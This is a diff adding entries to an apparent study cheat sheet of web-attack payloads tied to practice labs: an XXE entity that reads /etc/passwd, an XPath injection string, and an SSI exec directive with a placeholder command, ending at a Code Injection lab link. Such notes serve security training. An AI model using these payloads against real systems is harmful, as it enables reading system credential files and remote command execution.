@@ -26,3 +26,14 @@ password=*
 Lab : https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
 Payload :
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+&xxe;
+
+# XPATH Injection
+Lab : https://bwapp.hakhub.net/xmli_1.php
+Payload : ' or id='1
+
+# SSI Injection 
+Payload : <!--#exec cmd="OS_COMMAND" -->
+
+# Code Injection
+Lab : https://bwapp.hakhub.net/phpi.php
